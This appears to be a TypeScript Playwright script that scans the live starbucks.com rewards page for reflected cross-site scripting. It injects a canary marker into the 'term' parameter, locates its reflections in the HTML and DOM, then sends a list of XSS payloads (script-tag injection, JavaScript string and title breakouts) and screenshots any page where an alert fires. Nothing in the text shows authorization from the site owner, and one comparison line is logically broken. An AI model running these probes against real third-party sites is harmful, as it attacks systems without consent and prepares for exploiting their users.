import { chromium } from 'playwright';
import { launchHeadlessComet } from '../lib/comet-headless.ts';
import { saveScreenshot } from './utils.ts';

const MARKER = 'xsscanary99';
const { browser, close } = await launchHeadlessComet({ chromium });
const context = await browser.newContext();

// Step 1: Find WHERE the marker is reflected
const page = await context.newPage();
await page.goto(`https://www.starbucks.com/rewards?term=${MARKER}`, { waitUntil: 'domcontentloaded', timeout: 20000 });
const html = await page.content();

// Find all occurrences in source
const idx = html.indexOf(MARKER);
if (idx === -1) {
  console.log('[!] Marker not found in HTML source — may be reflected via JS only');
} else {
  console.log(`[*] Found marker at index ${idx}`);
  console.log('[*] Context around reflection:');
  console.log(html.slice(Math.max(0, idx - 150), idx + MARKER.length + 150));
}

// Check in DOM (rendered)
const domReflections = await page.evaluate((marker) => {
  const results: string[] = [];
  // Check title
  if (document.title.includes(marker)) results.push(`title: "${document.title}"`);
  // Check meta tags
  document.querySelectorAll('meta').forEach(m => {
    if ((m.content || '').includes(marker)) results.push(`meta[${m.name||m.property}]: "${m.content}"`);
  });
  // Check all text nodes
  const walker = document.createTreeWalker(document.body, NodeFilter.SHOW_TEXT);
  let node;
  while ((node = walker.nextNode())) {
    if (node.textContent?.includes(marker)) {
      results.push(`text in <${(node.parentElement?.tagName||'?').toLowerCase()}>: "${node.textContent.slice(0, 200)}"`);
    }
  }
  // Check all attributes
  document.querySelectorAll('*').forEach(el => {
    Array.from(el.attributes).forEach(attr => {
      if (attr.value.includes(marker)) {
        results.push(`attr [${el.tagName.toLowerCase()}@${attr.name}]: "${attr.value.slice(0, 200)}"`);
      }
    });
  });
  return results;
}, MARKER);

console.log(`\n[*] DOM reflections (${domReflections.length}):`);
domReflections.forEach(r => console.log(' ', r));

// Step 2: Try context-specific payloads based on reflection location
const TARGETED_PAYLOADS = [
  MARKER,                                  // baseline
  `${MARKER}"><script>alert(1)</script>`,  // closing HTML attribute
  `${MARKER}';alert(1)//`,                 // breaking JS string with single quote
  `${MARKER}";alert(1)//`,                 // breaking JS string with double quote
  `${MARKER}\`;alert(1)//`,               // template literal
  `${MARKER}</title><script>alert(1)</script>`, // inside title tag
  `${MARKER}<!--`,                          // inside HTML comment
  `${MARKER}%3Cscript%3Ealert(1)%3C/script%3E`, // URL encoded
];

console.log('\n[*] Testing targeted payloads...');
for (const payload of TARGETED_PAYLOADS) {
  const probePage = await context.newPage();
  let alertFired = false;
  probePage.on('dialog', async (d) => { alertFired = true; await d.dismiss(); });

  await probePage.goto(`https://www.starbucks.com/rewards?term=${encodeURIComponent(payload)}`,
    { waitUntil: 'domcontentloaded', timeout: 10000 }).catch(() => {});

  const ph = await probePage.content();
  const payloadInHtml = ph.includes(payload.replace(/</g, '&lt;') === ph ? payload : payload);
  const unescaped = ph.includes(payload) && !ph.includes(payload.replace(/</g, '&lt;'));

  if (alertFired) {
    console.log(`  [CONFIRMED XSS] ${payload.slice(0,60)}`);
    await saveScreenshot(probePage, 'https://www.starbucks.com', `xss-term-confirmed`);
  } else if (unescaped && payload !== MARKER) {
    console.log(`  [UNESCAPED] Payload appears unescaped in HTML: ${payload.slice(0,60)}`);
    await saveScreenshot(probePage, 'https://www.starbucks.com', `xss-term-unescaped`);
  } else {
    const escaped = ph.includes(payload.replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;').replace(/'/g, '&#x27;'));
    console.log(`  [safe] ${payload.slice(0,60)} — ${escaped ? 'HTML-escaped' : 'not reflected or encoded differently'}`);
  }
  await probePage.close();
}

await page.close();
await close();
